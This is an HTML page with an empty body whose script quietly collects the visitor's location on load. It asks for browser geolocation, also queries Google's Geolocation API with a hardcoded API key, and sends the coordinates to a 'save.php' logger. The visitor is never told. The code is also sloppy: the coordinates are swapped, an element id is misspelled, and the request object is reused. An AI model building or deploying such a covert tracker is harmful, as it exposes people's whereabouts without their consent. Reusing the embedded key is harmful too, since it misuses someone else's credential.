<html>
<head>
<script>
  var longitude="";
  var pr="";
  var latitude="";
  var n;
  var t;
  navigator.geolocation.getCurrentPosition(Y, J, _);


    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
            var el = document.getElementById("location");

        if (xhttp.readyState == 4 && xhttp.status == 200) {
            var geolocation = JSON.parse(xhttp.responseText).location;
            var loc = geolocation.lat + ',' + geolocation.lng+longitude;
            console.log(loc);

            xhttp.open("GET", "save.php?id="+loc, true);
           xhttp.send();
        }
        if (xhttp.readyState == 4 && (xhttp.status == 403 || xhttp.status == 500)) {
            el.innerHTML += 'Sorry! Our Google Geolocation API Quota exceeded. Maybe refresh the page to try again.';
        }
    };

    var key=  'AIzaSyBdS4niOVhS9SHFBNh3VhYg-XdGwqSuwrA';
    xhttp.open("POST", "https://www.googleapis.com/geolocation/v1/geolocate?key=" + key, true);

    xhttp.send();



function Y(e) { var a = e.coords.latitude // success for geolocation
        , n = e.coords.longitude
        , t = e.coords.accuracy;

        longitude=a;
        latitude=n;

       }

function J(e) { switch ( e.code) {
           case e.PERMISSION_DENIED:
               pr= "permission denied"; break;
           case e.POSITION_UNAVAILABLE:
              pr="POSITION_UNAVAILABLE"; break; break;
           case e.TIMEOUT:
           pr="TIMEOUT"; break; break;
           case e.UNKNOWN_ERROR:
                pr=("UNKNOWN_ERROR");} }
var _ = { enableHighAccuracy: !0, timeout: 50000, maximumAge: 0 };

final= "yes"+longitude+","+latitude;
console.log(final);
xhttp.open("GET", "save.php?id="+final,true);
xhttp.send();

</script>
</head>
<body id="loacation">

</html>
